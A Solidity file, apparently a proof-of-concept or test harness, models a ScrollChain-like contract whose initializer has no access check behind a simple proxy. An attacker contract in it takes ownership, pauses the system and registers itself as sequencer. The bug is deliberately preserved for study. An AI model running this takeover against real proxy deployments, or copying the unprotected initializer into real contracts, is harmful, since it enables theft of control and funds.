// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IScrollChainLike {
    function initialize(address messageQueue, address verifier, uint256 maxNumTxInChunk) external;
    function owner() external view returns (address);
    function setPause(bool status) external;
    function paused() external view returns (bool);
    function addSequencer(address account) external;
    function isSequencer(address account) external view returns (bool);
}

/// @notice Minimal transparent proxy used for exploit parity.
contract ScrollF1SimpleProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = bytes32(uint256(keccak256("scroll.f1.proxy.implementation")) - 1);
    bytes32 private constant ADMIN_SLOT = bytes32(uint256(keccak256("scroll.f1.proxy.admin")) - 1);

    error Unauthorized();
    error ImplementationNotSet();

    constructor(address admin_) {
        bytes32 adminSlot = ADMIN_SLOT;
        assembly {
            sstore(adminSlot, admin_)
        }
    }

    function admin() public view returns (address admin_) {
        bytes32 adminSlot = ADMIN_SLOT;
        assembly {
            admin_ := sload(adminSlot)
        }
    }

    function implementation() public view returns (address implementation_) {
        bytes32 implementationSlot = IMPLEMENTATION_SLOT;
        assembly {
            implementation_ := sload(implementationSlot)
        }
    }

    function upgradeTo(address implementation_) external {
        if (msg.sender != admin()) revert Unauthorized();
        bytes32 implementationSlot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(implementationSlot, implementation_)
        }
    }

    fallback() external payable {
        _delegate();
    }

    receive() external payable {}

    function _delegate() internal {
        address impl = implementation();
        if (impl == address(0)) revert ImplementationNotSet();
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// @notice ScrollChain-like model preserving the bug:
///         external initializer has no caller authorization and sets owner to msg.sender.
contract ScrollChainLike {
    bool internal initialized;
    address internal _owner;
    bool internal _paused;
    mapping(address => bool) internal _sequencer;

    error AlreadyInitialized();
    error Unauthorized();
    error ZeroAddress();

    constructor() {
        // Bug parity with _disableInitializers() on implementation deployment.
        initialized = true;
    }

    function initialize(address, address verifier, uint256) external {
        if (initialized) revert AlreadyInitialized();
        if (verifier == address(0)) revert ZeroAddress();
        initialized = true;
        _owner = msg.sender;
    }

    function owner() external view returns (address) {
        return _owner;
    }

    function paused() external view returns (bool) {
        return _paused;
    }

    function isSequencer(address account) external view returns (bool) {
        return _sequencer[account];
    }

    function setPause(bool status) external {
        if (msg.sender != _owner) revert Unauthorized();
        _paused = status;
    }

    function addSequencer(address account) external {
        if (msg.sender != _owner) revert Unauthorized();
        _sequencer[account] = true;
    }
}

contract ScrollChainInitAttacker {
    function hijack(address proxy, address messageQueue, address verifier, uint256 maxNumTxInChunk) external {
        IScrollChainLike(proxy).initialize(messageQueue, verifier, maxNumTxInChunk);
    }

    function pauseSystem(address proxy) external {
        IScrollChainLike(proxy).setPause(true);
    }

    function addSelfSequencer(address proxy, address attacker) external {
        IScrollChainLike(proxy).addSequencer(attacker);
    }
}

